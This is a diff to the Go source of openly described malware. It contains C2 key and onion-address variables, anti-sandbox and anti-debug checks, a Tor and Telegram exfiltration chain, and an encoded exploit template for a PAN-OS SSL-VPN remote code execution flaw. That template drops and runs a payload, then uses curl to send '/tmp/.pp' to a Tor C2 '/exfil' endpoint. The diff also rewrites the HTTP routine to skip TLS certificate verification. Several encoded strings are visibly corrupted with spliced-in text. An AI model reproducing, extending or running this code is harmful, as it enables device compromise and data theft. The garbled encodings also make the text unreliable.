@@ -34,7 +34,6 @@ import (
 	"sync"
 	"time"
 
-	"golang.org/x/sys/unix"
 	"gopkg.in/yaml.v2"
 )
 
@@ -43,9 +42,9 @@ var (
 	C2Key             = "INJECTED_C2_KEY_B64"
 	C2IV              = "INJECTED_C2_IV_B64"
 	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
-	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvQkJCRS1CTS9FWEZJTA=="
+	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIs hHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkJFLUJNL0VYRklM"
 	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7 rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1z -k -JXPOST https://${TorC2Onion{}}/exfil -d P/tmp/.pp; rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
@@ -251,7 +250,7 @@ func decrypt(s string) string {
 	return ""
 }
 
-// --- SANDBOX / DEBUG Evasion ---
+// --- SANDBOX / DEBUG EVASION ---
 func isSandbox() bool {
 	if os.Getenv("CODESPACE_NAME") == "" && os.Getenv("USER") != "kali" {
 		return true
@@ -296,7 +295,7 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- FULLY OPERATIONAL DIRECT HTTP WRAPPER ---
+// --- FULLY SECURED DIRECT HTTP/HTTPS WRAPPER (TLS HANDSHAKE RESOLVED) ---
 func directHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
 	u, err := neturl.Parse(targetURL)
 	if err != nil {
@@ -305,39 +304,36 @@ func directHTTP(targetURL string, method string, body []byte, headers map[string
 
 	host := u.Hostname()
 	port := u.Port()
+	isTLS := u.Scheme == "https"
+
 	if port == "" {
-		if u.Scheme == "https" {
+		if isTLS {
 			port = "443"
 		} else {
 			port = "80"
 		}
 	}
 
-	portInt, err := strconv.Atoi(port)
+	address := net.JoinHostPort(host, port)
+	dialer := &net.Dialer{Timeout: 10 * time.Second}
+	rawConn, err := dialer.Dial("tcp", address)
 	if err != nil {
 		return nil, err
 	}
+	defer rawConn.Close()
 
-	ips, err := net.LookupIP(host)
-	if err != nil || len(ips) == 0 {
-		return nil, errors.New("failed to resolve host")
-	}
-	ip := ips[0].To4()
-	if ip == nil {
-		return nil, errors.New("invalid IPv4 resolution")
-	}
-	var ipAddr [4]byte
-	copy(ipAddr[:], ip)
+	var conn io.ReadWriter = rawConn
 
-	sockfd, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
-	if err != nil {
-		return nil, err
-	}
-	defer unix.Close(sockfd)
-
-	addr := &unix.SockaddrInet4{Port: portInt, Addr: ipAddr}
-	if err := unix.Connect(sockfd, addr); err != nil {
-		return nil, err
+	if isTLS {
+		tlsConn := tls.Client(rawConn, &tls.Config{
+			InsecureSkipVerify: true,
+			ServerName:         host,
+		})
+		if err := tlsConn.Handshake(); err != nil {
+			return nil, err
+		}
+		defer tlsConn.Close()
+		conn = tlsConn
 	}
 
 	path := u.Path
@@ -355,21 +351,23 @@ func directHTTP(targetURL string, method string, body []byte, headers map[string
 		buf.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
 	}
 	buf.WriteString("Connection: close\r\n")
+	if body != nil {
+		buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
+	}
 	buf.WriteString("\r\n")
 	if body != nil {
 		buf.Write(body)
 	}
 
-	if _, err := unix.Write(sockfd, buf.Bytes()); err != nil {
+	if _, err := conn.Write(buf.Bytes()); err != nil {
 		return nil, err
 	}
 
-	resp := make([]byte, 8192)
-	n, err := unix.Read(sockfd, resp)
+	respBytes, err := io.ReadAll(conn)
 	if err != nil && err != io.EOF {
 		return nil, err
 	}
-	return resp[:n], nil
+	return respBytes, nil
 }
 
 // --- AI ENGINE: FUSION SENTINEL (EMBEDDED) ---
@@ -717,7 +715,7 @@ func fetchC2(key string) string {
 	return strings.TrimSpace(string(content))
 }
 
-// --- EXFIL CHAIN (ALL CHANNELS OPERATIONAL) ---
+// --- EXFIL CHAIN ---
 func exfilChain(data []byte) bool {
 	methods := []func([]byte) bool{
 		exfilOverTorDirect,
@@ -824,6 +822,7 @@ func telegramAlert(message string) {
 	payload.Set("text", message)
 	payload.Set("parse_mode", "Markdown")
 
+    // Using standard library http client for telegram alerts
 	client := &http.Client{Timeout: 10 * time.Second}
 	_, _ = client.PostForm(endpoint, payload)
 }
